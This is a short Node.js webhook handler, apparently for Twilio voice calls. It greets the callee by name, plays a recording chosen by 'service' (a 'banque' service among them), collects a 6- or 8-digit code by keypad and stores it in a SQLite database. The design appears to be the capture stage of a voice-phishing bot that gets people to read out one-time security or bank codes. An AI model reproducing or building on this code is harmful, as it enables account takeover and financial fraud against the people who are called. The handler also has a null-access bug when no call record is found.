module.exports = function(request, response) {
    const config = require('.././config');
    const sqlite3 = require('sqlite3').verbose();
    const db = new sqlite3.Database('./db/data.db');
    var input = request.body.RecordingUrl || request.body.Digits || 0;
    var callSid = request.body.CallSid;
    if (!!!callSid) {
        return response.status(200).json({
            error: 'Please give us the callSid.'
        });
    }
    db.get('SELECT service, name FROM calls WHERE callSid = ?', [callSid], (err, row) => {
        if (err) {
            return console.log(err.message);
        }
        var service = row == undefined ? 'default' : row.service;
        var name = row.name == null ? '' : row.name;
        if (config[service + 'filepath'] == undefined) service = 'default';
        var endurl = config.serverurl + '/stream/end';
        var askurl = config.serverurl + '/stream/' + service;
        var numdigits = service == 'banque' ? '8' : '6';
        var end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
        var ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="' + numdigits + '"><Say>Bonjour ' + name + ',</Say><Play loop="4">' + askurl + '</Play></Gather></Response>';
        length = service == 'banque' ? 8 : 6;
        if (input.length == length && input.match(/^[0-9]+$/) != null && input != null) {
            respond(end);
            db.run(`UPDATE calls SET digits = ? WHERE callSid = ?`, [input, request.body.CallSid], function(err) {
                if (err) {
                    return console.log(err.message);
                }
            });
        } else {
            respond(ask);
        }
    });

    function respond(text) {
        response.type('text/xml');
        response.send(text);
    }
};